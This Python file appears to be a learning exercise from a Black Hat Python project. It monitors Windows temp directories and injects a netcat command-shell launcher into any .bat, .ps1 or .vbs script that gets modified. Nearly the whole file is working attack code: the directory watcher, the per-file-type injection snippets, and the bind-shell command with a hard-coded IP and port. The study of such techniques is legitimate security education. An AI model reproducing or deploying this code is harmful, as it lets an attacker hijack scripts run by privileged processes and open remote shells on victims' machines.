#!/usr/bin/env python
# encoding: utf-8
"""
@file: file_monitor_code_injection.py
@time: 2022/5/27 9:57
@project: black-hat-python-2ed
@desc: P194 代码注入
"""
# Modified example, original given here:
# http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html

import os
import tempfile
import threading
import win32con
import win32file

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

FILE_LIST_DIRECTORY = 0x0001

# 将ch02中的netcat.py进行打包，打包命令：pyinstaller -F --hiddenimport win32timezone netcat.py
NETCAT = 'E:\\LearningDisk\\Learning_More\\netcat.exe'
TGT_IP = '192.168.56.101'
CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c '

# 记录各个文件后缀名对应的脚本代码片段
FILE_TYPES = {
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
}

# 设定要监控的文件夹
PATHS = ['c:\\Windows\\Temp', tempfile.gettempdir()]


def inject_code(full_filename, contents, extension):
    """
    代码注入和标记检查
    :param full_filename:
    :param contents:
    :param extension:
    :return:
    """
    if FILE_TYPES[extension][0].strip() in contents:
        return

    # 在文件中写入标记和运行的代码
    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Injected Code')


def monitor(path_to_watch):
    # 获取指向被监控目录的句柄
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )

    while True:
        try:
            # 在目录变动时，提供通知
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None
            )
            # 监控所有文件，并输出被修改的文件名或改动的具体类型
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')

                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')

                elif action == FILE_MODIFIED:
                    print(f'[*] Modified {full_filename}')
                    extension = os.path.splitext(full_filename)[1]
                    # 如果存在后缀名，注入代码
                    if extension in FILE_TYPES:
                        try:
                            with open(full_filename) as f:
                                contents = f.read()
                            print('[vvv] Dumping contents ... ')
                            inject_code(full_filename, contents, extension)
                            # print(contents)
                            print('[^^^] Dump complete.')
                        except Exception as e:
                            print(f'[!!!] Dump failed. {e}')

                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknown action on {full_filename}')
        except KeyboardInterrupt:
            break

        except Exception:
            pass


if __name__ == '__main__':
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path,))
        monitor_thread.start()
